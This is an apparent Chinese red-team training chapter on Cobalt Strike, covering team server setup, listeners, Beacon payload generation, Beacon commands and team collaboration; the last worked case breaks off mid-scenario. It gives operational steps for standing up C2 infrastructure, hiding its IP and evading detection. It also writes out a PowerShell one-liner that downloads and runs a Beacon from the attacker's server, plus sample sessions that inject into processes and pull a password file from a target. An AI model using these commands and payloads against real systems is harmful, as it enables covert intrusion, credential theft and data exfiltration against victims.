---
outline: deep
---

# 第57章 Cobalt Strike基础

> **难度等级：🔴 特等级**
>
> **预计学习时间：150分钟**
>
> **本章看点：Cobalt Strike简介、团队服务器搭建、客户端使用、Beacon原理、Payload生成、监听器配置、交互模式、团队协作、5个实战案例、15道习题**

::: tip 说明
恭喜你进入大神篇！

从这一章开始，
我们学习的内容
会更偏向实战、更专业。

这一章我们来学习
红队人手必备的神器——
**Cobalt Strike**。

Cobalt Strike是什么？
它是一款专业的渗透测试工具，
也是红队行动的标准装备。

为什么红队都用它？
因为它功能强大、
支持团队协作、
支持后渗透、
支持免杀、
支持流量隐匿...

总之，
想成为护网红队大神，
Cobalt Strike是必须掌握的。

这一章我们从基础开始，
一步步带你入门。

准备好了吗？
开始！
:::

---

## 57.1 什么是Cobalt Strike？

### 57.1.1 CS简介

Cobalt Strike（简称CS）
是由Strategic Cyber LLC
开发的一款渗透测试工具。

它最初是作为Metasploit的
一个前端GUI工具出现的，
后来逐渐发展成为一个
独立的、功能完整的
红队作战平台。

**CS的核心特点：**

- **团队协作** - 多人同时操作，实时共享
- **Beacon后门** - 功能强大的Payload
- **后渗透模块** - 提权、哈希、横向移动等
- **流量隐匿** - Malleable C2自定义流量
- **钓鱼攻击** - 鱼叉钓鱼、网站克隆
- **报告生成** - 自动生成渗透测试报告
- **脚本扩展** - Aggressor Script脚本语言

### 57.1.2 CS架构

Cobalt Strike采用
**客户端-服务器**架构。

```
┌─────────────┐     ┌─────────────┐
│  客户端A    │     │  客户端B    │
│ (攻击者A)   │     │ (攻击者B)   │
└──────┬──────┘     └──────┬──────┘
       │                   │
       └─────────┬─────────┘
                 │
        ┌────────▼────────┐
        │  团队服务器     │
        │  (Team Server)  │
        └────────┬────────┘
                 │
    ┌────────────┼────────────┐
    │            │            │
┌───▼───┐   ┌───▼───┐   ┌───▼───┐
│Beacon │   │Beacon │   │Beacon │
│目标A  │   │目标B  │   │目标C  │
└───────┘   └───────┘   └───────┘
```

**各组件说明：**

| 组件 | 说明 | 运行位置 |
|------|------|----------|
| Team Server | 团队服务器，CS的核心 | 攻击者VPS |
| Client | 客户端，GUI操作界面 | 攻击者电脑 |
| Beacon | 后门Payload | 目标机器 |
| Listener | 监听器，接收Beacon回连 | Team Server |

**工作流程：**
1. 攻击者在VPS上启动Team Server
2. 攻击者用Client连接Team Server
3. 攻击者生成Beacon Payload
4. 通过各种方式让目标运行Payload
5. Beacon回连到Team Server
6. 攻击者通过Client操作Beacon

> 💡 **深入理解：CS为什么采用"客户端-服务器"分离架构？**
>
> 这个架构设计有三个关键优势：
>
> **1. 分离身份 - Team Server是"前线"，Client是"后方"**
> ```
> Team Server（公网VPS）→ 直接与目标通信，暴露在公网
> Client（本地电脑）      → 只在局域网和TS通信，不暴露
>
> 如果Team Server被蓝队发现 → VPS被毁，但攻击者本地电脑安全
> 如果攻击者在本地操作 → 目标服务器上不会有你的真实IP痕迹
> ```
>
> **2. 多人协作 - 一个指挥部，多个操作员**
> ```
> 多个Client可以同时连接同一个Team Server
> 攻击者A负责提权、B负责横向移动、C负责信息收集
> 所有操作通过Team Server统一调度
> 就像特种作战中的指挥部和多个作战小组的配合
> ```
>
> **3. Beacon也走Team Server - 统一C2通道**
> ```
> 所有Beacon都回连到同一个Team Server
> → 统一端口（比如80/443），方便穿透防火墙
> → 统一管理，一个界面看到所有被控端
> → 统一日志，方便事后审计和报告生成
> ```
>
> 如果你用MSF，你得开多个listener、多个handler，
> 管好几个session，还不能团队协作。
> CS用一个Team Server就搞定了所有这些。

### 57.1.3 为什么红队都用CS？

**原因一：团队协作**

CS天生支持多人协作，
团队成员可以同时操作，
共享目标、共享会话、
实时沟通。

这对于红队行动非常重要，
因为红队通常是团队作战。

**原因二：功能全面**

CS集成了渗透测试的各个环节：
- 信息收集
- 漏洞利用
- 后渗透
- 横向移动
- 权限维持
- 钓鱼攻击
- 报告生成

基本上一个CS就能搞定
大部分渗透测试工作。

**原因三：Beacon强大**

Beacon是CS的Payload，
功能非常强大：
- 命令执行
- 文件管理
- 权限提升
- 凭据窃取
- 横向移动
- 端口转发
- SOCKS代理
- 键盘记录
- 屏幕截图
- ...

**原因四：流量隐匿**

CS支持Malleable C2，
可以自定义通信流量特征，
伪装成正常的网络流量，
绕过流量检测。

**原因五：生态丰富**

CS有丰富的插件生态，
社区开发了大量的
Aggressor Script脚本，
可以扩展CS的功能。

---

## 57.2 CS团队服务器搭建

### 57.2.1 环境要求

**系统要求：**
- Linux（推荐Kali、Ubuntu、CentOS）
-  Windows也可以，但推荐Linux

**硬件要求：**
- 内存：至少2GB（推荐4GB以上）
- 硬盘：至少10GB
- 网络：公网IP

**Java环境：**
- CS需要Java环境
- 推荐Java 11或Java 17

### 57.2.2 搭建步骤

**第一步：准备VPS**

买一台云服务器，
推荐配置：
- 系统：Ubuntu 20.04 / 22.04
- 配置：2核4G
- 带宽：5M以上
- 地域：根据需要选择

**第二步：安装Java**

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install openjdk-11-jdk -y

# 验证安装
java -version
```

**第三步：上传CS文件**

把CS的安装包上传到服务器，
解压到指定目录。

```bash
# 创建目录
mkdir -p /opt/cobaltstrike
cd /opt/cobaltstrike

# 解压（假设安装包叫cobaltstrike.tar.gz）
tar zxvf cobaltstrike.tar.gz

# 赋予执行权限
chmod +x teamserver
chmod +x agscript
```

**第四步：启动Team Server**

```bash
# 语法：./teamserver <IP地址> <密码> [Malleable C2配置文件]

# 基本启动
./teamserver 你的公网IP 你的密码

# 指定Malleable C2配置文件启动
./teamserver 你的公网IP 你的密码 c2.profile
```

::: tip 说明
- IP地址填你的公网IP
- 密码自己设置，要复杂一点
- 启动后默认监听50050端口（客户端连接用）
- 监听器的端口需要另外配置
:::

**第五步：设置防火墙**

```bash
# 开放50050端口（客户端连接）
ufw allow 50050/tcp

# 开放你要用的监听器端口（比如80、443、53等）
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 53/udp

# 查看防火墙状态
ufw status
```

**第六步：后台运行**

```bash
# 使用screen后台运行
screen -S c2
./teamserver 你的公网IP 你的密码 c2.profile

# 按 Ctrl+A+D 退出screen
# 重新进入：screen -r c2
```

或者用nohup：

```bash
nohup ./teamserver 你的公网IP 你的密码 c2.profile &
```

### 57.2.3 注意事项

1. **IP保护** - 不要暴露真实的C2服务器IP
2. **密码强度** - Team Server密码要足够复杂
3. **端口选择** - 监听器端口选常见端口（80、443、53等）
4. **CDN隐藏** - 有条件的话用CDN隐藏真实IP
5. **定期备份** - 定期备份CS的数据
6. **权限控制** - 团队成员权限要分级
7. **日志记录** - 开启日志，便于审计

---

## 57.3 CS客户端使用入门

### 57.3.1 连接Team Server

**Windows客户端：**
- 双击 `cobaltstrike.exe` 启动
- 或者用 `start.bat` 启动

**Linux客户端：**
```bash
./cobaltstrike
```

**连接界面：**
- Host：Team Server的IP地址
- Port：默认50050
- User：你的用户名（自己起一个）
- Password：Team Server的密码

填好后点击Connect，
第一次连接会弹出指纹确认，
确认无误后点击Yes。

### 57.3.2 界面介绍

CS的主界面主要分为
几个区域：

```
┌─────────────────────────────────────────────────────────┐
│ 菜单栏  │ 工具栏                                         │
├─────────┼───────────────────────────────────────────────┤
│         │                                               │
│ 目标    │              详细信息区域                      │
│ 列表    │              (根据选择的tab变化)               │
│         │                                               │
│         │                                               │
└─────────┴───────────────────────────────────────────────┘
```

**主要区域说明：**

1. **菜单栏** - 文件、视图、攻击、会话等菜单
2. **工具栏** - 常用功能按钮
3. **目标列表（左侧）** - 显示所有目标主机
4. **详细信息区域（右侧）** - 显示详细信息
   - Visualization - 可视化视图
   - Targets - 目标列表
   - Sessions - 会话列表
   - Credentials - 凭据列表
   - Downloads - 下载文件列表
   - Keystrokes - 键盘记录
   - Screenshots - 截图
   - ...

### 57.3.3 常用菜单

**Cobalt Strike菜单：**
- New Connection... - 新建连接
- Preferences - 偏好设置
- Listeners - 监听器管理
- Script Manager - 脚本管理器
- VPN - VPN配置
- Close - 关闭

**View菜单：**
- Targets - 目标视图
- Sessions - 会话视图
- Credentials - 凭据视图
- Downloads - 下载视图
- Keystrokes - 键盘记录
- Screenshots - 截图视图
- Event Log - 事件日志

**Attacks菜单：**
- Packages - Payload生成
  - HTML Application
  - MS Office Macro
  - Payload Generator
  - Scripted Web Delivery (S)
  - Windows Executable
  - Windows Executable (S)
- Web Drive-by - Web攻击
  - Clone Site
  - Host File
  - Manage
  - Scripted Web Delivery (S)
  - Signed Applet Attack
  - Smart Applet Attack
  - System Profiler
- Spear Phish - 鱼叉钓鱼
- Reporting - 报告

**Help菜单：**
- Help - 帮助文档
- About - 关于

---

## 57.4 Beacon介绍

### 57.4.1 什么是Beacon？

Beacon是Cobalt Strike的
Payload（后门程序）。

当目标机器运行了Beacon后，
它会回连到Team Server，
然后攻击者就可以
通过Team Server控制目标了。

### 57.4.2 Beacon的特点

1. **异步通信** - 默认是异步模式，定时回连
2. **交互模式** - 可以切换为交互式，实时响应
3. **支持多种协议** - HTTP、HTTPS、DNS、SMB等
4. **功能强大** - 集成了大量后渗透功能
5. **可扩展性强** - 支持加载脚本和插件
6. **轻量级** - 体积小，内存占用低

### 57.4.3 Beacon通信机制

**异步模式（默认）：**

```
Beacon        Team Server
  │                │
  │─── 睡眠 ──────▶│
  │                │
  │                │
  │◀── 任务 ──────│
  │                │
  │─── 执行 ──────▶│
  │    结果        │
  │                │
  │─── 睡眠 ──────▶│
  │                │
```

- Beacon会定期（睡眠一段时间后）回连
- 回连时检查有没有任务
- 有任务就执行，然后返回结果
- 然后继续睡眠，等待下一次回连

**睡眠间隔可以调整：**
```
beacon> sleep 60       # 每60秒回连一次
beacon> sleep 300 10   # 300秒，抖动10%（270-330秒之间随机）
```

**交互模式：**

```
beacon> interact
```

切换到交互模式后，
Beacon会频繁回连（每秒多次），
这样操作就很流畅了。

但是交互模式
网络特征比较明显，
容易被检测到。

> 💡 **深入理解：Beacon 的"异步通信"到底巧妙在哪里？——攻防双方的博弈**
>
> Beacon 的异步模式，是 CS 最核心的设计理念之一。
> 它不是"C2服务器主动控制被控端"，而是"被控端定时回家"。
>
> 这个设计源于一个很基本的网络攻防事实：
> ```
> 防火墙/IDS 对出站流量的管控远松于入站流量：
>
> 入站流量（外网 → 内网）：
>   防火墙："谁要进来？你是不是攻击者？严格检查！"
>   结果：大部分的入站端口都被封了
>
> 出站流量（内网 → 外网）：
>   防火墙："你要上网？去吧去吧"
>   结果：80/443/53 这些端口基本都开着
> ```
>
> 所以 CS 选择让 Beacon "主动出去找C2"，而不是"C2主动连Beacon"。
> 这就是为什么叫 Reverse HTTP/HTTPS——反向连接。
>
> 更深层的设计在于"睡眠+抖动"：
> ```
> Beacon sleep默认60秒 → 每60秒回家一次
> 加上 jitter（抖动）10% → 实际是54-66秒随机
>
> 这就是在对抗"流量分析检测"：
> - 如果每精确60秒来一个请求 → 太规律了！像心跳，很容易被检测
> - 如果是54-66秒随机来 → 更像真实用户的随机行为
> - 放在80/443端口 → 混在正常Web流量里
> ```
>
> 实战中调整sleep是一门学问：
> - 交互式操作 → sleep 0-5（高频，危险）
> - 日常监听 → sleep 60-300（中等，平衡）
> - 长期潜伏 → sleep 3600（每小时一次，极隐蔽）
>
> **Beacon 通信的"心跳机制"本质上是一场隐蔽与效率的博弈。**

### 57.4.4 Beacon类型

| 类型 | 通信协议 | 说明 |
|------|----------|------|
| HTTP Beacon | HTTP/HTTPS | 最常用，伪装成Web流量 |
| DNS Beacon | DNS | 通过DNS查询通信，隐蔽性高 |
| SMB Beacon | SMB | 通过命名管道通信，适合内网横向 |
| TCP Beacon | TCP | 直接TCP连接，适合内网 |
| External C2 | 自定义 | 外部C2，扩展通信方式 |

---

## 57.5 生成第一个Beacon

### 57.5.1 创建监听器

在生成Payload之前，
需要先创建一个监听器（Listener）。

**操作步骤：**

1. 点击菜单 `Cobalt Strike → Listeners`
2. 在Listeners窗口点击 `Add`
3. 填写监听器信息：
   - **Name** - 监听器名称（随便起，比如http1）
   - **Payload** - 选择Payload类型
     - `windows/beacon_http/reverse_http` - HTTP Beacon
     - `windows/beacon_https/reverse_https` - HTTPS Beacon
     - `windows/beacon_dns/reverse_dns_txt` - DNS Beacon
     - `windows/beacon_smb/bind_pipe` - SMB Beacon
   - **HTTP Hosts** - 回连的IP或域名
   - **HTTP Port (C2)** - 回连端口
   - **HTTP Host Header** - HTTP主机头（可选）
4. 点击 `Save` 保存

::: tip 监听器命名建议
建议用有意义的名字，比如：
- `http_80` - HTTP协议，80端口
- `https_443` - HTTPS协议，443端口
- `dns_beacon` - DNS Beacon
- `smb_internal` - 内网SMB Beacon
:::

### 57.5.2 生成Windows可执行文件

**操作步骤：**

1. 点击菜单 `Attacks → Packages → Windows Executable`
2. 在弹出的窗口中：
   - **Listener** - 选择刚才创建的监听器
   - **Output** - 输出格式
     - `Windows EXE` - exe可执行文件
     - `Windows Service EXE` - 服务用的exe
     - `Windows DLL` - DLL文件
   - **x64** - 是否生成64位版本
3. 点击 `Generate`
4. 选择保存位置

这样就生成了一个exe文件，
把这个exe放到目标机器上运行，
就会上线了。

### 57.5.3 生成Payload Generator

如果你需要其他格式的Payload，
可以用Payload Generator。

**操作步骤：**

1. 点击菜单 `Attacks → Packages → Payload Generator`
2. 选择监听器
3. 选择输出格式：
   - C
   - C#
   - Java
   - Perl
   - PowerShell
   - Python
   - Ruby
   - VBA
   - ...
4. 点击 `Generate`

生成的是Shellcode或者脚本，
你可以自己做免杀处理。

### 57.5.4 Scripted Web Delivery

这是一种很方便的上线方式，
通过Web服务器分发Payload。

**操作步骤：**

1. 点击菜单 `Attacks → Web Drive-by → Scripted Web Delivery (S)`
2. 配置：
   - **Listener** - 选择监听器
   - **Type** - 类型（powershell、python等）
   - **Local Host** - 本地监听IP
   - **Local Port** - 本地监听端口
   - **URL Path** - URL路径
   - **Launcher** - 启动器（powershell.exe、rundll32等）
3. 点击 `Launch`

启动后，
会生成一行命令，
比如：

```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://IP:8080/a'))"
```

在目标机器上执行这行命令，
就会自动下载并运行Beacon，
然后上线。

---

## 57.6 Listener监听器配置

### 57.6.1 HTTP/HTTPS监听器

HTTP/HTTPS监听器是最常用的。

**配置参数：**

| 参数 | 说明 |
|------|------|
| Name | 监听器名称 |
| Payload | Payload类型（http/https） |
| HTTP Hosts | 回连地址（可以多个，逗号分隔） |
| HTTP Port (C2) | C2通信端口 |
| HTTP Host Header | HTTP主机头 |
| HTTP Proxy | 代理设置 |
| HTTP Proxy Credentials | 代理凭据 |
| HTTP Method0 | GET请求方法 |
| HTTP Method1 | POST请求方法 |
| HTTP Headers | HTTP头 |
| HTTP Get URI | GET请求的URI |
| HTTP Post URI | POST请求的URI |

**HTTPS监听器额外配置：**
- **HTTP Port (C2)** - 一般用443
- **SSL Certificate** - SSL证书（可选，自签名也可以）

### 57.6.2 DNS监听器

DNS Beacon通过DNS查询通信，
隐蔽性很高。

**配置参数：**

| 参数 | 说明 |
|------|------|
| Name | 监听器名称 |
| Payload | DNS Beacon类型 |
| DNS Hosts | DNS域名（需要配置NS记录） |
| DNS Host (A) | A记录域名（可选） |
| DNS Host (AAAA) | AAAA记录域名（可选） |
| DNS Resolver | DNS解析器 |
| DNS Strategy | DNS策略 |
| DNS Beacon | DNS Beacon ID |

**DNS Beacon的原理：**
Beacon把数据编码到DNS查询中，
Team Server作为DNS服务器，
解析这些查询并提取数据。

**DNS Beacon的优点：**
- 隐蔽性高，DNS流量不容易被怀疑
- 可以绕过很多防火墙
- 适合出网严格的环境

**DNS Beacon的缺点：**
- 速度慢
- 配置复杂，需要域名
- 数据传输量小

### 57.6.3 SMB监听器

SMB Beacon通过
命名管道（Named Pipe）通信，
适合内网横向移动。

**配置参数：**

| 参数 | 说明 |
|------|------|
| Name | 监听器名称 |
| Payload | SMB Beacon类型 |
| Pipe Name | 管道名称 |

**SMB Beacon的特点：**
- 不需要新的网络连接
- 通过SMB协议通信
- 适合内网横向移动
- 只能在同一台机器或网络可达的机器之间使用

### 57.6.4 TCP监听器

TCP Beacon直接用TCP连接，
适合内网使用。

**配置参数：**

| 参数 | 说明 |
|------|------|
| Name | 监听器名称 |
| Payload | TCP Beacon类型 |
| Local Host | 监听IP |
| Local Port | 监听端口 |

---

## 57.7 Beacon交互模式

### 57.7.1 会话管理

**查看会话列表：**
点击 `View → Sessions`，
可以看到所有上线的Beacon。

**会话列表信息：**
- **PID** - Beacon进程ID
- **Host** - 主机名
- **IP** - IP地址
- **User** - 运行用户
- **OS** - 操作系统
- **Last** - 最后回连时间
- **Listener** - 使用的监听器
- **Sleep** - 睡眠时间
- **Ping** - 延迟

**打开会话：**
在目标上右键，
选择 `Interact`，
或者双击会话，
就可以打开Beacon的交互窗口。

### 57.7.2 基本命令

```
beacon> help           # 查看帮助
beacon> sleep 60       # 设置睡眠时间为60秒
beacon> sleep 300 10   # 睡眠时间300秒，抖动10%
beacon> checkin        # 强制立即回连
beacon> clear          # 清除队列中的命令
beacon> exit           # 退出Beacon
```

**信息收集命令：**

```
beacon> whoami         # 查看当前用户
beacon> getuid         # 查看用户ID
beacon> hostname       # 查看主机名
beacon> ipconfig       # 查看网络配置
beacon> netstat        # 查看网络连接
beacon> ps             # 查看进程列表
beacon> pwd            # 查看当前目录
beacon> ls             # 列出文件
```

**系统命令：**

```
beacon> shell whoami   # 执行系统命令
beacon> run whoami     # 执行程序（不等待输出）
beacon> execute whoami # 执行程序
beacon> powershell-import script.ps1  # 导入PowerShell脚本
beacon> powershell command           # 执行PowerShell命令
```

**文件操作命令：**

```
beacon> upload file.txt        # 上传文件
beacon> download file.txt      # 下载文件
beacon> cd C:\temp             # 切换目录
beacon> mkdir test             # 创建目录
beacon> rm file.txt            # 删除文件
beacon> cp src.txt dst.txt     # 复制文件
beacon> mv src.txt dst.txt     # 移动文件
beacon> cat file.txt           # 查看文件内容
```

**进程操作命令：**

```
beacon> ps                     # 列出进程
beacon> kill 1234              # 结束进程
beacon> inject 1234 x64 listener  # 注入进程
beacon> spawn listener         # 生成新的Beacon
beacon> getsystem              # 尝试获取System权限
```

### 57.7.3 异步模式 vs 交互模式

**异步模式（默认）：**
- Beacon定时回连
- 命令不会立即执行
- 网络特征不明显
- 适合长期潜伏

**交互模式：**
- Beacon频繁回连
- 命令实时响应
- 操作流畅
- 网络特征明显
- 适合操作时使用

**切换方式：**
```
beacon> sleep 0    # 切换到交互模式（睡眠时间为0）
beacon> sleep 60   # 切回异步模式
```

::: tip 实战建议
- 默认用异步模式，保持隐蔽
- 需要操作时再切换到交互模式
- 操作完立刻切回异步模式
- 睡眠时间根据环境调整
:::

---

## 57.8 CS团队协作功能

### 57.8.1 多人连接

CS支持多人同时连接
Team Server。

每个连接的用户
需要提供：
- 用户名（自己标识）
- Team Server密码

所有用户的操作
都会记录在事件日志中。

### 57.8.2 事件日志

点击 `View → Event Log`
可以查看事件日志。

事件日志记录了：
- 用户连接/断开
- 生成的Payload
- 执行的命令
- 上传下载的文件
- 新增的会话
- 等等...

### 57.8.3 会话共享

所有团队成员
都可以看到所有会话，
也都可以操作会话。

::: warning 注意
多人操作同一个会话
可能会造成混乱，
建议团队内部
做好分工和协调。
:::

### 57.8.4 凭据共享

所有获取到的凭据
都会自动保存到
凭据数据库中，
所有团队成员都可以查看。

点击 `View → Credentials`
可以查看所有凭据。

### 57.8.5 目标共享

所有发现的目标
都会添加到目标列表中，
团队成员可以共享目标信息。

### 57.8.6 沟通协作

CS内置了聊天功能，
团队成员可以在Event Log中
发送消息沟通。

```
# 在Event Log中输入消息
/msg 用户名 消息内容
/say 消息内容
```

---

## 📚 案例1：CS团队服务器完整搭建

### 场景描述
你需要搭建一个Cobalt Strike
团队服务器，用于红队行动。

### 操作步骤

**第一步：购买VPS**

选择一台云服务器：
- 系统：Ubuntu 22.04
- 配置：2核4G
- 带宽：5M
- 地域：香港（速度快，访问外网方便）

**第二步：安装Java**

```bash
# 更新软件源
apt update

# 安装Java 11
apt install openjdk-11-jdk -y

# 验证
java -version
```

输出：
```
openjdk version "11.0.20" 2023-07-18
OpenJDK Runtime Environment (build 11.0.20+8-post-Ubuntu-1ubuntu122.04)
OpenJDK 64-Bit Server VM (build 11.0.20+8-post-Ubuntu-1ubuntu122.04, mixed mode, sharing)
```

**第三步：上传CS**

用scp或者其他方式
把CS安装包上传到服务器。

```bash
# 在本地执行
scp cobaltstrike.tar.gz root@你的IP:/opt/
```

**第四步：解压安装**

```bash
cd /opt
tar zxvf cobaltstrike.tar.gz -C cobaltstrike/
cd cobaltstrike

# 赋予执行权限
chmod +x teamserver
chmod +x agscript
```

**第五步：准备Malleable C2配置文件**

下载一个C2 Profile，
或者自己写一个。

```bash
# 下载一个现成的profile
wget https://raw.githubusercontent.com/xxx/c2.profile -O c2.profile
```

**第六步：配置防火墙**

```bash
# 安装ufw
apt install ufw -y

# 开放SSH端口
ufw allow 22/tcp

# 开放Team Server端口
ufw allow 50050/tcp

# 开放HTTP/HTTPS端口
ufw allow 80/tcp
ufw allow 443/tcp

# 启用防火墙
ufw enable

# 查看状态
ufw status
```

**第七步：启动Team Server**

```bash
# 安装screen
apt install screen -y

# 创建screen会话
screen -S cs

# 启动Team Server
cd /opt/cobaltstrike
./teamserver 你的公网IP 复杂密码123! c2.profile
```

看到类似输出：
```
[*] Team Server is up on 0.0.0.0:50050
[*] SHA256 hash of server key: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

**第八步：客户端连接**

1. 在本地打开CS客户端
2. 填写连接信息：
   - Host: 你的公网IP
   - Port: 50050
   - User: redteam01
   - Password: 复杂密码123!
3. 点击Connect
4. 确认指纹，点击Yes

连接成功！
Team Server搭建完成。

### 经验总结
1. Team Server建议放在境外VPS上
2. 密码一定要复杂，防止被爆破
3. 建议使用Malleable C2，增强隐匿性
4. 定期备份CS数据
5. 不要把Team Server IP暴露给目标

---

## 📚 案例2：生成Payload并上线主机

### 场景描述
你已经搭建好了Team Server，
现在需要生成一个Payload，
让目标机器上线。

### 操作步骤

**第一步：创建HTTP监听器**

1. 菜单 → Cobalt Strike → Listeners
2. 点击 Add
3. 填写配置：
   - Name: http_8080
   - Payload: windows/beacon_http/reverse_http
   - HTTP Hosts: 你的公网IP
   - HTTP Port (C2): 8080
4. 点击Save

**第二步：生成Windows EXE**

1. 菜单 → Attacks → Packages → Windows Executable
2. 选择Listener: http_8080
3. Output: Windows EXE
4. 勾选 x64
5. 点击Generate
6. 保存为beacon.exe

**第三步：在目标机器上运行**

把beacon.exe传到目标机器上，
双击运行。

**第四步：查看上线**

几秒钟后，
在Sessions视图中
可以看到目标上线了。

信息如下：
- PID: 1234
- Host: WIN-TEST
- IP: 192.168.1.100
- User: WIN-TEST\testuser
- OS: Windows 10 (10.0 Build 19045)
- Last: 1秒前
- Listener: http_8080
- Sleep: 60s
- Ping: 50ms

**第五步：打开交互**

双击会话，
打开Beacon交互窗口。

```
beacon> whoami
[*] Tasked beacon to run: whoami
[+] host called home, sent: 1 bytes
[+] received output:
win-test\testuser

beacon> ipconfig
[*] Tasked beacon to run: ipconfig
[+] host called home, sent: 1 bytes
[+] received output:

Windows IP 配置


以太网适配器 Ethernet0:

   连接特定的 DNS 后缀 . . . . . . . :
   本地链接 IPv6 地址. . . . . . . . : fe80::xxxx:xxxx:xxxx:xxxx
   IPv4 地址 . . . . . . . . . . . . : 192.168.1.100
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 192.168.1.1
```

成功上线！

### 经验总结
1. 生成Payload时选择合适的监听器
2. 注意目标系统是32位还是64位
3. 生成的exe默认会被杀软检测，需要做免杀
4. 上线后先不要急着操作，先观察
5. 默认睡眠时间是60秒，可以调整

---

## 📚 案例3：Beacon常用命令演示

### 场景描述
目标已经上线，
现在演示Beacon的常用命令。

### 操作过程

**信息收集：**

```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 1 bytes
[+] uid=testuser(1000) gid=testuser(1000) groups=testuser(1000),....

beacon> hostname
[*] Tasked beacon to get hostname
[+] host called home, sent: 1 bytes
[+] WIN-TEST

beacon> ipconfig
[*] Tasked beacon to run: ipconfig
[+] received output:
...（网络配置信息）

beacon> netstat -ano
[*] Tasked beacon to run: netstat -ano
[+] received output:
...（网络连接信息）

beacon> ps
[*] Tasked beacon to list processes
[+] received output:

 PID   PPID  Name               Arch  Session  User
 ---   ----  ----               ----  -------  ----
 0     0     [System Process]
 4     0     System             x64   0
 160   4     smss.exe           x64   0
 ...
```

**文件操作：**

```
beacon> pwd
[*] Tasked beacon to print working directory
[+] C:\Users\testuser\Desktop

beacon> ls
[*] Tasked beacon to list files in .
[+] received output:
 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 12kb     fil     01/01/2024 10:00:00   test.txt
 0kb      dir     01/01/2024 10:00:00   test_dir

beacon> upload /root/tool.exe
[*] Tasked beacon to upload /root/tool.exe as tool.exe
[+] host called home, sent: 1048576 bytes
[+] uploaded 1048576 bytes

beacon> download test.txt
[*] Tasked beacon to download test.txt
[+] host called home, sent: 1 bytes
[+] download of test.txt complete, 1024 bytes

beacon> mkdir temp
[*] Tasked beacon to create temp

beacon> cd temp
[*] Tasked beacon to cd to temp
[+] changed directory
```

**命令执行：**

```
beacon> shell whoami /all
[*] Tasked beacon to run: whoami /all
[+] received output:

USER INFORMATION
----------------

User Name         SID
================= ==============================================
win-test\testuser S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-1000


GROUP INFORMATION
-----------------
...

beacon> run calc.exe
[*] Tasked beacon to run: calc.exe
[+] host called home, sent: 1 bytes

beacon> powershell Get-Process
[*] Tasked beacon to run: Get-Process
[+] received output:

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    345      20     5678      12345       1.23   1234   1 chrome
    ...
```

**进程操作：**

```
beacon> ps
[*] Tasked beacon to list processes
[+] received output:
  PID   PPID  Name                   Arch  Session  User
  ---   ----  ----                   ----  -------  ----
  ...
  5678  1234  notepad.exe            x64   1        win-test\testuser
  ...

beacon> inject 5678 x64 http_8080
[*] Tasked beacon to inject Windows x64 beacon (http_8080) into 5678
[+] host called home, sent: 1 bytes
[+] established link to child beacon: 192.168.1.100

beacon> spawn x64 http_8080
[*] Tasked beacon to spawn Windows x64 beacon (http_8080)
[+] host called home, sent: 1 bytes
[+] established link to child beacon: 192.168.1.100

beacon> kill 5678
[*] Tasked beacon to kill 5678
[+] killed
```

### 经验总结
1. Beacon命令很多，常用的要记熟
2. shell命令用来执行cmd命令
3. powershell命令用来执行PowerShell
4. inject用来注入进程
5. spawn用来生成新的Beacon会话

---

## 📚 案例4：CS文件管理与命令执行

### 场景描述
演示CS的文件管理功能
和命令执行功能。

### 文件管理演示

**上传文件：**

```
beacon> upload /path/to/local/file.txt
[*] Tasked beacon to upload /path/to/local/file.txt as file.txt
[+] host called home, sent: 1024 bytes
[+] uploaded 1024 bytes
```

上传的文件会保存到
Beacon的当前工作目录。

**下载文件：**

```
beacon> download C:\Users\test\Documents\password.txt
[*] Tasked beacon to download C:\Users\test\Documents\password.txt
[+] host called home, sent: 1 bytes
[+] download of password.txt complete, 512 bytes
```

下载的文件会保存到
CS客户端的downloads目录。

也可以在 `View → Downloads`
中查看和管理下载的文件。

**文件浏览：**

CS提供了文件浏览器，
可以像资源管理器一样
浏览目标文件系统。

操作方式：
在目标上右键 → Explore → File Browser

### 命令执行演示

**执行CMD命令：**

```
beacon> shell ipconfig /all
beacon> shell net user
beacon> shell net localgroup administrators
```

**执行PowerShell命令：**

```
beacon> powershell Get-Service
beacon> powershell Get-Process | Where-Object {$_.Name -like "*chrome*"}
```

**导入PowerShell脚本：**

```
beacon> powershell-import PowerView.ps1
beacon> powershell Get-NetUser
```

**执行EXE：**

```
beacon> execute -i cmd.exe
beacon> run program.exe arg1 arg2
```

execute vs run vs shell：
- `shell` - 通过cmd.exe执行，有输出
- `execute` - 直接执行程序，可交互
- `run` - 执行程序，不等待输出

### 经验总结
1. 文件上传下载很方便，大文件也可以
2. PowerShell功能很强大，很多工具都可以用
3. 文件浏览器很直观，适合不熟悉命令的人
4. 注意不要上传下载太大的文件，容易被检测

---

## 📚 案例5：CS多人协同作战演示

### 场景描述
红队有3名成员，
需要协同完成一次渗透测试。

团队分工：
- 队长：整体指挥，关键操作
- 队员A：Web渗透，外网打点
- 队员B：内网渗透，横向移动

### 操作过程

**第一步：Team Server准备**

队长启动Team Server：
```bash
./teamserver 公网IP TeamPassw0rd! c2.profile
```

**第二步：队员连接**

队员A和队员B
分别用自己的用户名连接：
- 队员A：redteam_A
- 队员B：redteam_B

**第三步：任务分配**

队长在Event Log中发布任务：

```
[09:00] 队长: 大家好，今天的任务是拿下目标域
[09:01] 队长: A负责外网打点，找入口
[09:01] 队长: B负责准备内网工具和脚本
[09:02] 队长: 有问题随时沟通
[09:03] redteam_A: 收到
[09:03] redteam_B: 收到
```

**第四步：协同作战**

队员A通过Web渗透
拿到了一台外网服务器，
上线了第一个Beacon。

```
[10:00] 队长: A那边有进展了，拿到一台Web服务器
[10:01] 队长: B准备一下，等下转你做内网
[10:02] redteam_B: 好的，工具已经准备好了
```

队员A在目标上
做了信息收集和提权，
拿到了System权限，
然后把会话转交给队员B。

```
[11:00] redteam_A: Web服务器已经提权到System
[11:00] redteam_A: 已经导出了本地哈希，有一个域用户
[11:01] 队长: 好的，B接手内网部分
[11:02] redteam_B: 收到，我来操作
```

队员B开始内网渗透，
信息收集、横向移动、
域渗透...

```
